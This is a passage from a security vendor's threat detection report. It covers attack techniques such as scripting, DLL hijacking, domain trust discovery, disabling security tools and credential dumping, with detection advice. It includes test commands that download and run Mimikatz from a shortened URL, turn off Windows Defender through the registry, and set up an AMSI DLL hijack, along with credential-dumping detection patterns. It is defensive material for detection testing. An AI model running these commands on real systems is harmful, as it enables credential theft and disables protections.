The detection strategies in this section were brought to

you by Justin Schoenfeld! Justin is experienced in threat

hunting, incident response, and researching industry-

wide threat intelligence. He earned his B.A. in Computing

Security from the Rochester Institute of Technology, where

he had the opportunity to co-op for a large corporation and

a startup company. His love for endpoint telemetry came

from his experience as an advanced threat engineer for a

large global hospitality company.

46

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 6 4

Scripting

Adversaries continue to evolve their use of Scripting in response to improved application controls. Routinely among our top
threats, malicious scripts are performant, available, and inconspicuous.

#7

O V E R A L L
R A N K

Analysis

2018

9

38%

O R G A N I Z A T I O N S
A F F E C T E D

838

C O N F I R M E D
T H R E A T S

2019

7

Change      2

We observed slight increases in the prevalence

of Scripting from 2018 to 2019, both in terms of

the percentage of organizations affected and

the percentage of total threat volume.

Why do adversaries use Scripting?

Scripting is a relatively broad technique that covers a wide array of behaviors, many of them involving the use of tools and

languages that are functionally critical components of operating systems. Scripts are as versatile as they are ordinary,

which makes it difficult to baseline normal scripting activity and build detection strategies for abnormal scripting activity.

Because continued improvements to (and adoption of) application control solutions make it difficult to install a malicious

binary on a host machine, scripts allow adversaries to perform actions without having to install anything. There is also no

shortage of publicly available scripts—malicious and benign—that administrators or adversaries can find on the internet

and use to perform all variety of actions.

47

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use Scripting?

Adversaries use scripts to perform actions on an endpoint. This might include using a script to download something

from an external host, embedding a script in an email attachment as part of a phishing campaign, embedding binaries

that might be blocked into a script, or writing a script that automates and expedites otherwise tedious work that would

have to be done by hand.

We routinely observe:

•

•

•

•

Direct execution of local scripts via default scripting harnesses (e.g., cscript.exe and wscript.exe)

Execution of a script within a process that can execute scripts (e.g., cmd.exe or PowerShell)

Execution of processes such as rundll32.exe with a script host scheme

Identification and exploitation of vulnerable, trusted scripts, such as pubprn.vbs

The adversary behaviors we observe most commonly involve Windows script hosts (e.g., cscript.exe or wscript.exe) or

other popular scripts (e.g., JavaScript or Visual Basic Script) making network connections to an external host.

Emerging tactics

Some less common malicious Scripting methods include:

•

•

Adware and malware installers on macOS using obfuscated script content that deobfuscates at runtime (e.g., Shlayer

and Bundlore)

Scripts that are dynamically created at runtime (e.g., impacket smbexec does this to write commands to disk

temporarily)

Sighted with

We frequently detect adversaries using Scripting in conjunction with other techniques, most notably Mshta (T1170) and

Deobfuscate/Decode Files or Information (T1140). Mshta can be used as a proxy to execute scripts and, as a result, we

have a high volume of analytics that trigger on and map to both Scripting and Mshta-related activity. Co-occurence with

Deobfuscate/Decode Files or Information is more obvious, as it is commonplace for adversaries to obfuscate their scripts.

48

2020 Threat Detection Report

C U S T O M E R S   A F F E C T E D

Definition

T 1 0 6 4 :   S C R I P T I N G

Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual.

Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources.

Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the

operating system at an API level instead of calling other programs. Common scripting languages for Windows include

VBScript and PowerShell, but could also be in the form of command-line batch scripts.

Detection
MITRE’s data sources

•

•

•

Process monitoring

File monitoring

Process command-line parameters

Collection requirements

For all the various ways an adversary might leverage Scripting, there are two general approaches for gathering the visibility

needed to detect and investigate Scripting activity. For one, you can target malicious use of Scripting by focusing on the

means of execution. Valuable data sources for this approach include:

49

2020 Threat Detection Report

•

•

Process monitoring (including process network actions and module loads)

Process command-line parameters

Alternatively, you could also focus on data sources that help with detecting and investigating the actual contents of

malicious scripts. In this case, it’s critically important to monitor files and collect the actual scripts. While this will almost

certainly be time intensive—both in terms of machine processing and analysis—it will also provide important context.

Detection suggestions

We’ve produced effective analytics by focusing on script host process telemetry. Specifically, it makes sense to look out for

abnormal activity emanating from processes that are capable of running scripts. Such abnormal activity might include:

•

•

•

Establishment of persistence mechanisms

Making network connections

Unexpected process ancestry

You may want to look for wscript.exe or cscript.exe spawning from command shells (e.g., cmd.exe or powershell.exe), Office

applications, web browsers, and web service handlers. Also look out for scripts executing from unusual locations, including

user-writable paths and temporary directories.

Some adversaries attempt to execute scripts from hosts in abnormal ways, so it’s a good idea to monitor for suspicious

module loads of binaries related to hosting scripts (e.g., vbscript.dll).

Weeding out false positives

While you will almost certainly find malice by alerting on scripting engines that make external network connections, doing

so will also overwhelm you and your team with a high volume of false positives. As always, be specific in your detection

logic and robust in your suppression logic, so you can control false positives while casting an effectively wide net for

suspicious activity.

50

2020 Threat Detection Report

Testing

Start testing your defenses against Scripting using Atomic Red Team—an open source testing framework of small, highly

portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1064: Scripting. In most environments, these should be sufficient to generate a useful signal

for defenders.

Run this test on a Windows system using PowerShell:

New-Item $env:TEMP\T1064 _ script.bat -Force | Out-Null

Set-Content -Path $env:TEMP\T1064 _ script.bat -Value “dir”

Start-Process $env:TEMP\T1064 _ script.bat

51

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

powershell.exe, cmd.exe

File monitoring

write and execute from appdata\local\temp

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Kyle Rainey
I N T E L L I G E N C E   A N A L Y S T

The detection strategies in this section were brought to

you by Kyle Rainey! Kyle has been providing proactive

and reactive incident response and forensics services

to Fortune 500 companies for over five years. He has

extensive experience working with organizations to

strengthen their security postures and security operations.

At Red Canary, he helps engineer impactful, scalable

intelligence products.

52

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 3 8

DLL Search Order Hijacking

Dridex infections are the main reason that we observe high levels of DLL Search Order Hijacking in the environments we
monitor. However, we’ve also observed Emotet and PlugX leveraging the technique.

16%

O R G A N I Z A T I O N S
A F F E C T E D

788

C O N F I R M E D
T H R E A T S

#8

O V E R A L L
R A N K

Analysis

2018

75

2019

8

Change      67

Rising from 75 to eight, DLL Search Order

Hijacking is the most ascendant technique

across our customer base. This increase is likely

the result of improved detection abilities on our

end rather than a distinct rise in prevalence.

Why do adversaries use DLL Search Order Hijacking?

DLL Search Order Hijacking offers adversaries a reliable and often discreet method for persisting, elevating their privileges,

and evading defensive controls. Rather than overtly installing a malicious binary, the adversary can introduce a malicious

DLL masquerading under a legitimate filename into the same subdirectory as a given legitimate process.

When that process needs to conduct a specific action, it searches for the DLL with the legitimate name, first looking in the

folder in which it lives. Finding the malicious DLL in the same folder, it will load that library, thus giving the attacker code

execution from within the legitimate host process. Most often, we observe a legitimate executable known to be vulnerable

to hijacking dropped by the adversary along with the malicious DLL.

DLL Search Order Hijacking is elusive, and it’s something we’ve historically struggled to detect—both specifically here

at Red Canary and more generally as an industry. However, as its rise in prevalence suggests, we made a lot of progress

expanding our detection coverage for the threat in 2019.

53

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use DLL Search Order Hijacking?

There are multiple ways that a DLL Search Order Hijack might unfold. One particularly common method involves the

establishment of a scheduled task that launches a seemingly legitimate executable that then loads the malicious DLL.

Sighted with

DLL Search Order Hijacking occurs most frequently in conjunction with Scheduled Task (T1053) and Process Injection

(T1055), both likely the result of Emotet activity that often precedes a TrickBot infection. Slightly less often, we also see

the technique associated with Remote File Copy (T1105), Windows Admin Shares (T1077), and Domain Trust Discovery

(T1482), techniques that are more concretely linked to TrickBot. As such, we see the latter three techniques occurring in

conjunction with DLL Search Order Hijacking slightly less often than the former two because we frequently detect and

mitigate Emotet before it loads TrickBot.

We also see the technique occur with Process Hollowing (T1093), which is likely the result of Dridex activity.

C U S T O M E R S   A F F E C T E D

54

2020 Threat Detection Report

Definition

T 1 0 3 8 :   D L L   S E A R C H   O R D E R   H I J A C K I N G

Windows systems use a common method to look for required DLLs to load into a program. Adversaries may take

advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation

and persistence.

Detection
MITRE’s data sources

•

•

•

•

File monitoring

DLL monitoring

Process monitoring

Process command-line parameters

Collection requirements

The most reliable data sources for observing DLL Search Order Hijacking are process monitoring and DLL load monitoring

(in that order). These sources will allow you to observe when trusted processes deviate from ordinary, benign behavior,

allowing you to track the cause of bad behaviors to specific DLLs.

Detection suggestions

Again, DLL Search Order Hijacking presents detection and prevention challenges to our entire industry, primarily because

the technique proxies the execution of malicious content through a signed, trusted binary. The most helpful patterns we’ve

seen so far are:

•

•

•

Signed Microsoft binaries being written by cmd.exe to ProgramData or user AppData folders

Signed, trusted binaries executing from User AppData or ProgramData folders loading a single unsigned

DLL from the same folder

Scheduled task creation to execute binaries from User AppData or ProgramData folders

55

2020 Threat Detection Report

•

•

•

Trusted DLLs located in normal system paths such as kernel32.dll or ntdll.dll located in abnormal folders

Frequency analysis on the least commonly found DLLs located outside of normal system folders

Unsigned DLLs written to suspicious folders such as Temp or AppData

You’ll want to look for DLL loads emanating from apparently unusual locations and and figure out if these are normal in

your environment.

Weeding out false positives

Looking for any generic process loading a DLL from its same folder sounds like a good idea. Unfortunately, this will create

a high volume of false positives from Windows System32 and Program Files folders. Target your hunts to user-writable

folders for the best results.

Testing

Start testing your defenses against DLL Search Order Hijacking using Atomic Red Team—an open source testing framework

of small, highly portable detection tests mapped to MITRE ATT&CK.

56

2020 Threat Detection Report

Getting started

View Atomic tests for T1038: DLL Search Order Hijacking. In most environments, these should be sufficient to generate a

useful signal for defenders.

Run this test on a Windows system using Command Prompt:

copy %windir%\System32\windowspowershell\v1.0\powershell.exe

%APPDATA%\updater.exe copy %windir%\System32\amsi.dll %APPDATA%\

amsi.dll%APPDATA%\updater.exe -Command exit

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

powershell.exe

DLL Monitoring

amsi.dll with incorrect filepath

Process command line

powershell.exe renaming itself

File monitoring

binary metadata discrepancies for updater.exe and amsi.dll

57

2020 Threat Detection Report

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Justin Schoenfeld
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were brought to

you by Justin Schoenfeld! Justin is experienced in threat

hunting, incident response, and researching industry-

wide threat intelligence. He earned his B.A. in Computing

Security from the Rochester Institute of Technology, where

he had the opportunity to co-op for a large corporation and

a startup company. His love for endpoint telemetry came

from his experience as an advanced threat engineer for a

large global hospitality company.

58

2020 Threat Detection Report

T E C H N I Q U E   T 1 4 8 2

Domain Trust Discovery

The majority of Domain Trust Discovery activity we observe results from TrickBot using nltest.exe to gather domain trust
information from Active Directory for the purpose of lateral movement.

13%

O R G A N I Z A T I O N S
A F F E C T E D

784

C O N F I R M E D
T H R E A T S

#9

O V E R A L L
R A N K

Analysis

2018

30

2019

9

Change      21

Domain Trust Discovery was only added to

ATT&CK in 2019. We retroactively re-mapped

two discovery techniques, which collectively

ranked 30th in 2018, to T1482 while creating

this report.

Why do adversaries use Domain Trust Discovery?

Added in February 2019, Domain Trust Discovery is a relatively new discovery technique in MITRE’s ATT&CK matrix. In

Windows environments, trust relationships play a critical role in determining who can access what resources. Domain Trust

Discovery more directly relates to the ways that one domain in a given network environment can either inherit trust from—

or grant it to—other domains, endpoints, and users in that environment.

In order to determine which user accounts have access to what systems, an adversary has to understand the user accounts

that exist within a given domain and the trust relationships between that domain and others. As such, discovering domain

trust information is tremendously useful for an adversary or malware that is intent on moving laterally between systems in

a compromised environment.

59

2020 Threat Detection Report

T H R E A T   V O L U M E

How do adversaries use Domain Trust Discovery?

In our dataset, the prevalence of Domain Trust Discovery is due entirely to TrickBot outbreaks in a relatively small number

of customer environments. The detection logic that alerts our detection engineering team to this aspect of TrickBot is

designed to trigger when nltest.exe executes with certain command-line options. A couple of those options include:

•

•

/domain_trusts

/all_trusts

Nltest is a native Microsoft command-line tool that administrators often use to enumerate domain controllers (DC) and

determine trust status between domains, to name a few important features.

Outside of TrickBot, several popular post-exploitation frameworks have the ability to perform Domain Trust Discovery,

either through Windows APIs or Lightweight Directory Access Protocol (LDAP) queries:

•

Empire and PowerSploit use the DsEnumerateDomainTrusts API calls, LDAP queries for

(objectClass=trustedDomain) when enumerating domain trusts, and the .NET method Forest.

GetAllTrustRelationships() when enumerating forest trusts.

•

PoshC2 uses Forest.GetAllTrustRelationships() from the System.DirectoryServices assembly as well.

Other tools that can enumerate domain trusts are the native Microsoft command-line tool dsquery and Adfind.exe, which

has been used by FIN6 and Ryuk before to discover AD users and groups as well.

You can read about some additional methods and explanations of Domain Trust Discovery on Will Schroeder’s blog.

Sighted with

Like many of the other techniques that owe their prominence on this list to TrickBot, this technique is frequently

seen in tandem with:

•

•

Scheduled Task (T1053)

Process Injection (T1055)

•  Windows Admin Shares (T1077)

•

•

Disabling Security Tools (T1089)

Remote File Copy (T1105)

60

2020 Threat Detection Report

C U S T O M E R S   A F F E C T E D

Definition

T 1 4 8 2 :   D O M A I N   T R U S T   D I S C O V E R Y

Adversaries may attempt to gather information on domain trust relationships that may be used to identify Lateral

Movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a

domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow

the users of the trusted domain to access resources in the trusting domain. The information discovered may help the

adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using

the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be

used by adversaries to enumerate domain trusts.

Detection
MITRE’s data sources

•

•

•

•

•

Azure activity logs

Office 365 account logs

API monitoring

Process monitoring

Process command-line parameters

Collection requirements

While MITRE does not include it among its data sources, network logs for LDAP queries (typically port 389 over TCP/

UDP) are another good collection source for defenders seeking to observe Domain Trust Discovery activity. Security

61

2020 Threat Detection Report

teams seeking to observe malicious instances of Domain Trust Discovery will also want to collect logs relating to process

monitoring and process command-line parameters.

Detection suggestions

The analytics that will uncover Domain Trust Discovery attempts are relatively simple, but they vary in feasibility as your

environment scales. Most organizations can work to detect nltest.exe with these command lines:

•

•

/domain_trusts

/all_trusts

In a similar vein to nltest.exe, dsquery.exe can be used to enumerate domain trusts with the following command line:

•

dsquery * -filter “(objectClass=trustedDomain)” -attr *

The ADFind tool can also be used to query domain trusts with the following command lines:

•

•

adfind.exe -f objectclass=trusteddomain

adfind.exe -sc trustdmp

If you are able to collect and analyze LDAP queries, you’ll want to scrutinize any that originate from non-DCs with the

substring (objectClass=trustedDomain), especially if other suspicious reconnaissance actions are identified.

Weeding out false positives

Looking for generic detection of nltest.exe without specific command-line options will lead you down some high-volume

paths. The best route with this technique is to be specific.

62

2020 Threat Detection Report

Testing

Start testing your defenses against Domain Trust Discovery using Atomic Red Team—an open source testing framework of

small, highly portable detection tests mapped to MITRE ATT&CK.

Getting started

View Atomic tests for T1482: Domain Trust Discovery. In most environments, these should be sufficient to generate a useful

signal for defenders.

Run this test on a Windows system using Command Prompt:

nltest /domain _ trusts

63

2020 Threat Detection Report

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

nltest.exe

Process command line

“/domain_trusts”

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Thomas Gardner
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were brought to

you by Thomas Gardner! At Red Canary, he splits his time

investigating threats to customers and developing new

methods of finding them. Previously, Thomas worked at

CenturyLink in various roles spanning incident response,

threat hunting, and threat intelligence.

64

2020 Threat Detection Report

T E C H N I Q U E   T 1 0 8 9

Disabling Security Tools

The increased prevalence of adversaries Disabling Security Tools is attributable to specific and highly prevalent threats
such as Emotet and TrickBot.

23%

O R G A N I Z A T I O N S
A F F E C T E D

771

C O N F I R M E D
T H R E A T S

#10

O V E R A L L
R A N K

Analysis

2018

8

2019

10

Change      2

Disabling Security Tools fell from eight in

2018 to 10 in 2019, despite a slight increase

in the percentage of total threat volume it

accounted for.

Why do adversaries Disable Security Tools?

Adversaries disable or tamper with security tools to enable activities that would otherwise be prevented, to avoid

detection, or both. In some cases, tools must be disabled in order to gain initial access to a system. In other cases, they

may be disabled to facilitate one or many additional tactics throughout the lifecycle of the intrusion. The security tools that

adversaries seek and disable, and the manner in which those tools are affected, vary widely.

T H R E A T   V O L U M E

65

2020 Threat Detection Report

How do adversaries Disable Security Tools?

This technique is broad and can be used to capture the intent of many other techniques within the Defense Evasion tactic.

As a result, the methods employed by adversaries are not always predictable. The targets of tampering are numerous but

commonly include:

•

•

•

•

•

•

•

Endpoint protection suites

Host-based firewalls

Endpoint detection and response (EDR)

Virtual private networking (VPN) configurations

Platform security interfaces, such as the Antimalware Scan Interface (AMSI) on Windows

Logging mechanisms

Security-related kernel extensions

The most commonly observed techniques include disabling local security controls, such as endpoint protection (antivirus)

or host-based firewalls. This may be done via software or by an operator.

TrickBot and Emotet are two highly prevalent trojans that include a number of features aimed at detecting and disabling

Microsoft Windows Defender and Defender ATP, among other endpoint protection suites, rendering these endpoint

protection products ineffective through changes to the registry or by leveraging built-in system management utilities, such

as PowerShell. Similarly, Carbanak, NanoCore, and countless others will disable or modify local firewalls to ensure that

communications are not impeded.

Emerging tactics

More subtle but potentially much more damaging techniques—such as AMSI bypasses and selective tampering of EDR,

logging mechanisms, and other low-level controls—are more prevalent in community research than they are in the wild.

That said, we do know that they are being leveraged by adversaries. Evidence of this includes the use of tools such as

fltMC.exe (a Windows system utility being used to unload minifilter drivers that are often a key pillar of data collection for

antivirus), data loss prevention, and other monitoring tools on Windows systems.

Lastly, the two classes of attack that are common among almost all controls are prevention or deletion of local logging

and the use of a wide variety of configuration changes that may result in local logs not being submitted to a central data

collector, such as a SIEM. Like this technique and others related to this tactic, these classes of attack may be used to affect

all logging or log collection, or they may be targeted at collection of only certain event types that the adversary knows to be

of concern.

Emerging tactics

•

•

•

Masquerading (T1036), for evasion

Scheduled Task (T1053), likely used as a persistence mechanism to shield execution

Process Injection (T1055,) useful for unhooking security tools from malicious processes and hiding malicious code

within legitimate processes to shield execution

66

2020 Threat Detection Report

C U S T O M E R S   A F F E C T E D

Definition

T 1 0 8 9 :   D I S A B L I N G   S E C U R I T Y   T O O L S

Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of

killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other

methods to interfere with security scanning or event reporting.

Detection
MITRE’s data sources

•

•

•

API monitoring

File monitoring

Services

•  Windows Registry

•

•

Process command-line parameters

Antivirus

Collection requirements

Defense evasion techniques are generally non-specific with respect to the types of systems or data that you are trying to

protect. Thus, any security tool that produces defensive telemetry—to include event logs or alerts, or logs of the tool’s state

and configuration—will be immensely valuable when building detection criteria.

67

2020 Threat Detection Report

Process monitoring

One data source that we recommend adding is process monitoring, as the presence of running processes or actions taken

to stop a running process are both valuable data points.

File monitoring and Windows Registry

File monitoring and Windows Registry will be most useful in determining whether a tool is running or its startup

configuration has been changed. Returning to TrickBot as a relevant example, most of the evasions that this tool puts in

place will result in a change to relevant data in one of these two locations.

Process command-line parameters

Similarly, monitoring for process command-line parameters will often reveal the act of making these changes, while

services will reveal a common result.

Detection suggestions

Detection of this technique can be abstracted into two categories: detection of overt or otherwise known forms of

tampering and identification of new techniques.

Detection of overt or known forms of tampering can be effective when you understand how your security tools are

deployed, configured, and operated. A simple checklist that you can use to build basic detection use cases might look

 like this:

•  What process is used to install the software, and what changes are made to the system?

Understanding the install file structure itself, the name and appearance of the process that executes the installer,

and the files and/or Registry changes (“configurations”) that the installer makes is a good baseline.

•

Do configurations change under normal circumstances?

If so, how do specific configurations change, and under what process and user context do these changes appear?

•  What are the process and service names associated with the software?

Monitor for use of process and service controls (start, stop, add, remove, change) related to these items, which

will vary by platform.

•  What other processes will interact with the software?

On Windows, monitor for cross-process events, such as injection or thread manipulation.

More advanced techniques can be a challenge, as they rely on detailed knowledge of the software, require that you detect

the absence of data, or both.

Like all software, security software contains bugs. Some of those bugs introduce vulnerabilities that can be exploited.

Understanding the resources—DLLs, drivers, shared objects, and other kernel-level extensions—required or loaded by

the software can help build additional monitoring use cases. Unless the software is intentionally changed, the resources

leveraged by the software should not change, be replaced, or appear in new locations.

68

2020 Threat Detection Report

Lastly, look out for tampering in the absence of any overt behavior. If your EDR platform emits a median of 10 events per

endpoint per second, and that drops to five: is there a predictable cause? Would you even notice? Could you practically

investigate? Apply this same logic to the presence or contents of log files.

Detecting anything other than the complete absence of data is a challenge for most organizations. Start by keeping it

simple and move towards the complex:

•

•

•

•

Detect the complete absence of data from a given control

Detect the absence of a particular data element (e.g., a heartbeat or regularly occurring value)

Detect the absence of a type of data (e.g., the absence of file modification events when all other events

appear as expected)

Detect on deviations from median event rate

Testing

Start testing your defenses against Disabling Security Tools using Atomic Red Team—an open source testing framework of

small, highly portable detection tests mapped to MITRE ATT&CK.

69

2020 Threat Detection Report

Getting started

View Atomic tests for T1089: Disabling Security Tools. In most environments, these should be sufficient to generate a useful

signal for defenders.

Run this test on a Windows system using PowerShell:

Set-ItemProperty “HKLM:\SOFTWARE\

Policies\Microsoft\Windows Defender”

-Name DisableAntiSpyware -Value 1

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

powershell.exe

Registry modifications

PowerShell manipulating Windows Defender operation

70

2020 Threat Detection Report

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Cathy Cramer
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were brought to

you by Cathy Cramer! Cathy can spot cyber threats from a

mile away. She can also secure web apps, program, speak

multiple languages, and build architectural designs. Before

joining Red Canary as a detection engineer, she worked

with the threat analysis team at Carbon Black.

71

2020 Threat Detection Report

A D D I T I O N A L   R E S E A R C H :   T E C H N I Q U E   T 1 0 0 3

Credential Dumping

While it wasn’t among our top 10 threats by volume, Credential Dumping affected a wide swath of our customers, due in no
small part to the prominence of tools such as Mimikatz.

32%

O R G A N I Z A T I O N S
A F F E C T E D

762

C O N F I R M E D
T H R E A T S

#11

O V E R A L L
R A N K

Analysis

2018

12

2019

11

Change      1

Credential Dumping accounted for a slightly

larger percentage of total threats in 2019

but affected a slightly smaller percentage

of customers.

Why do adversaries Dump Credentials?

Credential Dumping refers to a variety of methods that adversaries and professional penetration testers use to obtain

legitimate usernames and passwords. Legitimate credentials offer adversaries one of the most effective and discreet means

of accessing valuable data and systems. While there are methods of access that don’t require legitimate user credentials

(vulnerability exploitation, for example), a working username and password are among the best tools for inconspicuously

accessing a system of interest. For this reason, there is a vibrant market for stolen credentials on a wide variety of criminal

forums.

Listed under the “Credential Access” tactic, Credential Dumping also enables initial access, lateral movement, and privilege

escalation. The technique’s prevalence is largely the result of necessity. Adversaries effectively need credentials to

accomplish their goals, and there is an abundance of very effective credential theft tools (e.g., Mimikatz, L0phtCrack, and

gsecdump) that help accommodate this need.

72

2020 Threat Detection Report

Mimikatz is a major contributor to the prominence of Credential Dumping among threat detections in the environments

we monitor.

T H R E A T   V O L U M E

How do adversaries Dump Credentials?

Some behaviors we commonly observe are:

•

•

•

PowerShell and other processes (e.g., Windows Task Manager and Sysinternals ProcDump) accessing and dumping

memory from the Local Security Authority Subsystem Service (lsass.exe)

NTDSUtil dumping NTDS.dit (Active Directory)

Active Directory Explorer (AD Explorer) taking snapshots of Active Directory

•  Windows Registry Console Tool (reg.exe) exporting Windows Registry hives containing credentials

•  Windows Credential Editor dumping NT Lan Manager (NTLM) hashes

Emerging tactics

Some less common behaviors include:

•

•

Using Credential Dumping tools such as SafetyKatz and Cobalt Strike in memory

Leveraging Credential Dumping tools in non-executable files such as XSL stylesheet

Sighted with

We frequently observe this technique occurring in tandem with PowerShell (T1086), which is likely because the most common

invocation method for Mimikatz relies on PowerShell.

73

2020 Threat Detection Report

C U S T O M E R S   A F F E C T E D

Definition

T 1 0 0 3 :   C R E D E N T I A L   D U M P I N G

Credential dumping is the process of obtaining account login and password information, normally in the form of a hash

or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral

Movement and access restricted information. Several of the tools mentioned in this technique may be used by both

adversaries and professional security testers. Additional custom tools likely exist as well.

Detection
MITRE’s data sources

•

•

•

•

API monitoring

Process monitoring

PowerShell logs

Process command-line parameters

Collection requirements

MITRE ATT&CK does not include file monitoring (e.g., password files written to disk) among the data sources that are useful

for observing Credential Dumping. While it may be an indication of credential theft activity along with other data sources—

such as process monitoring or process command-line parameters—file monitoring by itself is not a reliable data source for

Credential Dumping activity.

74

2020 Threat Detection Report

Process monitoring

Process monitoring, however, is a data source that security teams should collect from if they want to observe Credential

Dumping involving tools such as Mimikatz, Empire, L0phtCrack, and gsecdump. One quick and reliable way to observe

and potentially detect credential harvesting is to monitor processes for known malicious binaries in combination with

LSASS injection. Understanding the processes or programs in an environment that require access to LSASS will make this

approach more effective.

Process command-line parameters

Monitoring process command-line parameters for known malicious CLI syntaxes may take some research and testing, but

it’s also a reliable way to observe and/or detect credential harvesting activity emanating from tools such as Mimikatz and

Empire. In order for this data source to be used effectively, command lines must be specific and not overly generalized (i.e.,

using only one command option filter).

PowerShell logs

Enabling and monitoring PowerShell logs for known malicious syntax can help to detect Credential Dumping activity as

well. This is particularly useful for observing things such as Invoke-Mimikatz and POWELIKS. At times when malicious

binaries may not be observed via process monitoring, PowerShell logs may help detect activity reliant on PowerShell.

API monitoring

API monitoring is another good source to collect on if you want to observe Credential Dumping. The key to API monitoring

is knowing what and who should be directly connecting to the domain controller (DC). Knowing what IP address,

applications, and user accounts typically make API calls to the DC will help to reduce false positives and create more

reliable detections to Credential Dumping activity, particularly for tools such as DCSync, Mimikatz, and PowerSploit.

Detection suggestions

If you’re interested in generating reliable detection coverage for Credential Dumping activity, you’ll want to consider

monitoring for the following behaviors:

•

•

•

Unknown or known malicious processes injecting into LSASS

DC connections from unusual IP addresses associated with non-standard or known compromised user accounts

reg.exe usage with command-line reg save hklm\sam

75

2020 Threat Detection Report

•

•

The binary mimikatz.exe or references to Mimikatz arguments in the CLI

Use of ntdsutil ifm

Weeding out false positives

Many of the techniques and tools used for administrative purposes can also be used for malicious Credential Dumping

activity. As such, monitoring of processes without CLI and/or context can lead to a large number of false positives,

particularly with processes such as adfind.exe, taskmgr.exe, ntdsutil.exe, reg.exe, vssadmin.exe, PowerShell, and

adexplorer.exe.

Testing

Start testing your defenses against Credential Dumping using Atomic Red Team—an open source testing framework of

small, highly portable detection tests mapped to MITRE ATT&CK.

76

2020 Threat Detection Report

Getting started

View Atomic tests for T1003: Credential Dumping. In most environments, these should be sufficient to generate a useful

signal for defenders.

Run this test on a Windows system using PowerShell:

powershell.exe “IEX (New-Object Net.

WebClient).DownloadString(‘http://bit.ly/

L3g1tCrad1e’); Invoke-Mimikatz -DumpCr”

Useful telemetry will include:

DATA SOURCE

TELEMETRY

Process monitoring

powershell.exe

Process command line

“DownloadString”, “WebClient”, and the presence of a URL

Network connection

powershell.exe establishing an external network connection

77

2020 Threat Detection Report

Review and repeat

Now that you have executed one or several common tests and checked for the expected results, it’s useful to answer some

immediate questions:

•  Were any of your actions detected?

•  Were any of your actions blocked or prevented?

•  Were your actions visible in logs or other defensive telemetry?

Repeat this process, performing additional tests related to this technique. You can also create and contribute tests

of your own.

D E T E C T I O N   S T R A T E G I S T

Ricky Espinoza
D E T E C T I O N   E N G I N E E R

The detection strategies in this section were brought to

you by Ricky Espinoza! Ricky has eight years of experience

and multiple SANS certifications. Prior to joining Red

Canary, Ricky worked at the University of Colorado running

incident response procedures, network security, and

vulnerability management.

78

2020 Threat Detection Report

A D D I T I O N A L   R E S E A R C H :   T E C H N I Q U E   T 1 0 4 7

Windows Management Instrumentation

Officially an execution technique, Windows Management Instrumentation (WMI) is leveraged for lateral movement and
discovery as well. Our many hundreds of WMI detections arise from a wide array of disparate threats.

26%

O R G A N I Z A T I O N S
A F F E C T E D

566

C O N F I R M E D
T H R E A T S

#13

O V E R A L L
R A N K

Analysis

2018

17

2019

13

Change      4

Why do adversaries use WMI?

Jumping from 17th to 13th, WMI saw slight

increases both in terms of the percentage of

customers affected and percentage of total

threat volume.

Like many of the threats highlighted in this report, WMI is a native Windows utility that administrators use regularly to

automate tasks and remotely manage systems in their environments. Adversaries generally use WMI for the same reasons

that administrators use it: to execute processes on remote systems. Since it’s installed by default and routinely used for

benign purposes, it blends in with normal operating system activity.

Security analysts and other network defenders occasionally struggle with WMI process ancestry. For example, malicious

activity traced back to the WMI Provider Host, WMIPrvSE.exe, leads to a dead end in the process tree. On a local host, this

may mean a WMI Event Consumer was used for persistence.

In the case of lateral movement, the WMIPrvSE.exe execution on one host should correlate to a WMI Command Line (wmic.

exe) execution on the originating host. Attackers may also leverage WMI to avoid detection based on process ancestry,

79

2020 Threat Detection Report

such as using an Office macro to set a WMI event consumer to launch a malicious PowerShell command—thereby avoiding

defenders who monitor PowerShell activity spawned by Office.

Specific to the environments we monitor (and contrary to its classification as an execution technique), we’ve observed a

substantial number of adversaries using WMI to enumerate user accounts or other system information for reconnaissance.

Some of our analytics also trigger on adversaries using WMI for lateral movement.

T H R E A T   V O L U M E

How do adversaries use WMI?

Some of the common ways we see adversaries leveraging WMI include:

•

•

•

•

•

